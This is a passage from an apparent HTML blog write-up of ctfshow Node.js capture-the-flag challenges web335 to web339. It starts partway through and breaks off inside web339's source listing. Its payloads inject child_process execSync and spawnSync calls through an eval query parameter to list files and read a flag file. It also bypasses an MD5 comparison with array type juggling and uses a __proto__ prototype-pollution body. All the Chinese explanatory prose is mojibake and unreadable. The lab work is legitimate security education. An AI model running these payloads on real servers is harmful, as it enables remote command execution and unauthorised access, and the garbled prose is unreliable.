<p>Node.js ä¸­çš„ <code>Buffer</code> ç±»æ˜¯ç”¨äºç›´æ¥å¤„ç†äºŒè¿›åˆ¶æ•°æ®çš„ç‰¹æ®Šå¯¹è±¡ï¼Œç±»ä¼¼äºæ•´æ•°æ•°ç»„ï¼Œä½†å¯¹åº” V8 å †å¤–çš„åŸå§‹å†…å­˜åˆ†é…ã€‚</p>
<div class="code-container" code-lang="Javascript"><div class="codebox"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; execSync &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bufferOutput = <span class="title function_">execSync</span>(<span class="string">&#x27;ls&#x27;</span>); <span class="comment">// è¿”å› Buffer</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(bufferOutput); <span class="comment">// è¾“å‡º: &lt;Buffer 64 6f 63 75 6d 65 6e 74 73 0a&gt;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p><code>.toString()</code></p>
<ul>
<li>å°†Bufferè½¬æ¢ä¸ºUTF-8ç¼–ç çš„å­—ç¬¦ä¸²</li>
<li>å¦‚æœå‘½ä»¤è¾“å‡ºæ˜¯æ–‡æœ¬ï¼Œå¯æ­£ç¡®æ˜¾ç¤ºç»“æœ</li>
</ul>
<p>payload</p>
<div class="code-container" code-lang="Javascript"><div class="codebox"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">eval</span>=<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;ls&#x27;</span>).<span class="title function_">toString</span>();</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>



<h2 id="web336"><a href="#web336" class="headerlink" title="web336"></a>web336</h2><p>è¿™æ¬¡æŠŠexecè¿‡æ»¤äº†ï¼Œæˆ‘ä»¬å°†execSyncæ›¿æ¢ä¸ºspawnSyncå³å¯</p>
<p>æˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸‹spanwnSyncçš„è¯­æ³•</p>
<div class="code-container" code-lang="Javascript"><div class="codebox"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">spawnSync</span>(<span class="string">&#x27;ls&#x27;</span>, [<span class="string">&#x27;-l&#x27;</span>,<span class="string">&#x27;/&#x27;</span>], &#123; <span class="attr">stdio</span>: <span class="string">&#x27;pipe&#x27;</span> &#125;).<span class="property">stdout</span>.<span class="title function_">toString</span>();</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>è¿™ä¸ªä¸åƒexecSyncç›´æ¥å°†å­—ç¬¦ä¸²æ”¾å…¥shellä¸­æ‰§è¡Œè€Œæ˜¯å°†å‘½ä»¤ä½œä¸ºå‚æ•°å»è°ƒç”¨lsè¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œåé¢çš„æ•°ç»„åˆ™æ˜¯å‚æ•°ï¼Œåé¢çš„èŠ±æ‹¬å·åˆ™æ˜¯Node.jsçš„é…ç½®ï¼Œæˆ‘åº”è¯¥ç”¨ä¸åˆ°</p>
<p><strong><code>stdout</code></strong></p>
<ul>
<li><strong>ä½œç”¨</strong>ï¼š<code>spawnSync</code> æ–¹æ³•è¿”å›ä¸€ä¸ªå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡åŒ…å«å…³äºå·²å®Œæˆè¿›ç¨‹çš„è¯¦ç»†ä¿¡æ¯ã€‚<code>.stdout</code> æ˜¯è¿™ä¸ªå¯¹è±¡çš„ä¸€ä¸ªå±æ€§ï¼Œå®ƒä¸“é—¨æ•è·äº†å­è¿›ç¨‹æ‰§è¡Œå‘½ä»¤åå‘<strong>æ ‡å‡†è¾“å‡ºï¼ˆstdoutï¼‰</strong> æµå†™å…¥çš„æ•°æ®ã€‚</li>
<li><strong>è¯´æ˜</strong>ï¼šåœ¨ Unix&#x2F;Linux ç³»ç»Ÿä¸­ï¼Œç¨‹åºé€šå¸¸æœ‰ä¸‰ä¸ªæ ‡å‡†æµï¼š<ul>
<li><code>stdin</code> (æ ‡å‡†è¾“å…¥ - 0)</li>
<li><strong><code>stdout</code> (æ ‡å‡†è¾“å‡º - 1)</strong> &lt;- è¿™é‡Œç”¨çš„å°±æ˜¯è¿™ä¸ª</li>
<li><code>stderr</code> (æ ‡å‡†é”™è¯¯ - 2)<br>  <code>cat fl001g.txt</code> å‘½ä»¤ä¼šå°†æ–‡ä»¶å†…å®¹è¾“å‡ºåˆ° <code>stdout</code>ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬ç”¨ <code>.stdout</code> æ¥è·å–å®ƒã€‚</li>
</ul>
</li>
</ul>
<div class="code-container" code-lang="Javascript"><div class="codebox"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">eval</span>=<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">spawnSync</span>(<span class="string">&#x27;cat&#x27;</span>, [<span class="string">&#x27;fl001g.txt&#x27;</span>]).<span class="property">stdout</span>.<span class="title function_">toString</span>();</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>





<h2 id="web337"><a href="#web337" class="headerlink" title="web337"></a>web337</h2><p>ç»ˆäºå¯ä»¥çœ‹åˆ°æºç äº†</p>
<div class="code-container" code-lang="Javascript"><div class="codebox"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">md5</span>(<span class="params">s</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> crypto.<span class="title function_">createHash</span>(<span class="string">&#x27;md5&#x27;</span>)</span><br><span class="line">    .<span class="title function_">update</span>(s)</span><br><span class="line">    .<span class="title function_">digest</span>(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;xxxxxxx&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> a = req.<span class="property">query</span>.<span class="property">a</span>;</span><br><span class="line">  <span class="keyword">var</span> b = req.<span class="property">query</span>.<span class="property">b</span>;</span><br><span class="line">  <span class="keyword">if</span>(a &amp;&amp; b &amp;&amp; a.<span class="property">length</span>===b.<span class="property">length</span> &amp;&amp; a!==b &amp;&amp; <span class="title function_">md5</span>(a+flag)===<span class="title function_">md5</span>(b+flag))&#123;</span><br><span class="line">  	res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  	res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>,&#123; <span class="attr">msg</span>: <span class="string">&#x27;tql&#x27;</span>&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>åˆåˆ°äº†ç†Ÿæ‚‰çš„MD5ç»•è¿‡ï¼Œä½†æ˜¯è¿™æ¬¡çš„è¿‡æ»¤ä¸ä¸€æ ·ï¼Œéœ€è¦aå’Œbé•¿åº¦ä¸€è‡´ç„¶å<code>a!==b</code>ä½†æ˜¯<code>md5(a+flag)===md5(b+flag)</code>ï¼Œç›´è§‰çš„æƒ³åˆ°æ•°ç»„ç»•è¿‡ï¼Œä½†æ˜¯åŠ å¯†ä¸æ˜¯ç›´æ¥åŠ å¯†è€Œæ˜¯è¦åŠ ä¸Šflagï¼Œè€Œä¸”flagæ˜¯ä¸çŸ¥é“çš„ä¹Ÿå°±æ˜¯æ— æ³•çˆ†ç ´ã€‚</p>
<p>æˆ‘ä»¬éœ€è¦çŸ¥é“åœ¨jsä¸­ä¼ å…¥æ•°ç»„æ˜¯ä»€ä¹ˆæ ·çš„</p>
<div class="code-container" code-lang="Javascript"><div class="codebox"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[]=<span class="number">1</span>&amp;b[]=<span class="number">2</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>å¾—åˆ°çš„æ˜¯</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/07/02/ctfshow-nodejs/93f2b41c044f0065ff9a29cf9c20f142.png" class title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">

<p>å°±æ˜¯ä¸€ä¸ªç®€å•çš„æ•°ç»„ï¼Œç„¶åæˆ‘ä»¬å†æ¥çœ‹ä¸‹æ‹¼æ¥çš„ç»“æœ</p>
<div class="code-container" code-lang="Javascript"><div class="codebox"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">5</span>+[<span class="number">6</span>,<span class="number">6</span>]); <span class="comment">//56,6</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;5&quot;</span>+<span class="number">6</span>); <span class="comment">//56</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;5&quot;</span>+[<span class="number">6</span>,<span class="number">6</span>]); <span class="comment">//56,6</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;5&quot;</span>+[<span class="string">&quot;6&quot;</span>,<span class="string">&quot;6&quot;</span>]); <span class="comment">//56,6</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>å¯ä»¥çœ‹åˆ°ï¼Œæ— è®ºæ•°ç»„ä¸­æ˜¯æ•°å­—è¿˜æ˜¯å­—ç¬¦ä¸²ï¼Œä¹‹é—´éƒ½æ˜¯ä½¿ç”¨é€—å·éš”å¼€ï¼Œç„¶åå’Œå…¶ä»–æ•°å­—å’Œå­—ç¬¦ä¸²è¿›è¡Œæ‹¼æ¥</p>
<p>äºæ˜¯æ€è·¯æœ‰äº†ï¼Œåªéœ€è¦aå’Œbä¸­å€¼ä¸€è‡´ä½†æ˜¯aæ˜¯å­—ç¬¦ä¸²ï¼Œbä¸ºæ•°ç»„å³å¯ç»•è¿‡</p>
<div class="code-container" code-lang="Javascript"><div class="codebox"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="number">1</span>&amp;b[]=<span class="number">1</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>



<h2 id="web338"><a href="#web338" class="headerlink" title="web338"></a>web338</h2><p>ç»ˆäºè¦åˆ°é¢å¯¹å¯¹è±¡ä»£ç äº†ï¼Œä¹Ÿç»ˆäºè¦åˆ°åŸå‹é“¾æ±¡æŸ“äº†</p>
<p>ç»™äº†æˆ‘ä»¬ä¸€ä¸ªexpressæ¡†æ¶ï¼Œç›´æ¥é”å®šè·¯ç”±login.js</p>
<div class="code-container" code-lang="Javascript"><div class="codebox"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> utils = <span class="built_in">require</span>(<span class="string">&#x27;../utils/common&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line"><span class="comment">//body-parseræ˜¯ä¸€ä¸ªä¸­é—´ä»¶ç”¨äºè¿”å›å¤„ç†æ•°æ®çš„å‡½æ•°è¿™é‡Œæ˜¯json  ä½¿ç”¨jsonæ•°æ®ä¸ä¼šè¢«è®¤ä¸º__proto__ä¸ºåŸå‹</span></span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> secert = &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> sess = req.<span class="property">session</span>;</span><br><span class="line">  <span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">  utils.<span class="title function_">copy</span>(user,req.<span class="property">body</span>);<span class="comment">//æ¼æ´è§¦å‘ç‚¹æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„å¯¹è±¡å’Œéœ€è¦éªŒè¯çš„å¯¹è±¡ä¹‹é—´è¿›è¡Œèµ‹å€¼</span></span><br><span class="line">  <span class="keyword">if</span>(secert.<span class="property">ctfshow</span>===<span class="string">&#x27;36dboy&#x27;</span>)&#123;</span><br><span class="line">    res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;ç™»å½•å¤±è´¥&#x27;</span>+<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(user)&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>æˆ‘ä»¬å†æ¥çœ‹copyæ–¹æ³•</p>
<div class="code-container" code-lang="Javascript"><div class="codebox"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">copy</span>:copy</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">copy</span>(<span class="params">object1, object2</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> object2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> object2 &amp;&amp; key <span class="keyword">in</span> object1) &#123;</span><br><span class="line">            <span class="title function_">copy</span>(object1[key], object2[key])<span class="comment">//å…ˆé€šè¿‡é€’å½’è®¿é—®protoä¸ºé”®çš„å€¼&#123;&quot;ctfshow&quot;:&quot;36dboy&quot;&#125;</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            object1[key] = object2[key]<span class="comment">//ç„¶åè¿›è¡Œèµ‹å€¼ æ¼æ´è§¦å‘ç‚¹ è¿›è¡Œèµ‹å€¼ï¼Œå¯ä»¥å®ç°åŸå‹é“¾æ±¡æŸ“</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>å°±æ˜¯ä¸€ä¸ªç®€å•çš„åˆå¹¶æ•°ç»„å‡½æ•°ï¼Œç›´æ¥åŸå‹é“¾æ±¡æŸ“</p>
<p>payload</p>
<div class="code-container" code-lang="Javascript"><div class="codebox"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;ctfshow&quot;</span>:<span class="string">&quot;36dboy&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>





<h2 id="web339"><a href="#web339" class="headerlink" title="web339"></a>web339</h2><p>æˆ‘ä»¬è¿˜æ˜¯ç›´æ¥çœ‹åŒ…å«è·¯ç”±çš„login.js</p>
<div class="code-container" code-lang="Javascript"><div class="codebox"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 